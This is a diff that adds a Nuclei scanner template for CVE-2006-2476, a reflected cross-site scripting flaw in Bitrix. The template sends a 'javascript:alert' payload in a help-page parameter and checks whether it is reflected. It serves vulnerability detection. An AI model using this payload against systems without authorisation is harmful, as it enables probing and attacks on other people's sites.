@@ -1,0 +1,31 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: CVE-2006-2476
+
+info:
+  name: Bitrix XSS - CVE-2006-2476
+  author: imhunterand
+  severity: medium
+  tags: cve,cve2006,xss,bitrix
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/bitrix/help/en/index.html?page=javascript:alert('{{randstr}}')"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{randstr}}'
+          - '<form action="javascript:alert'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
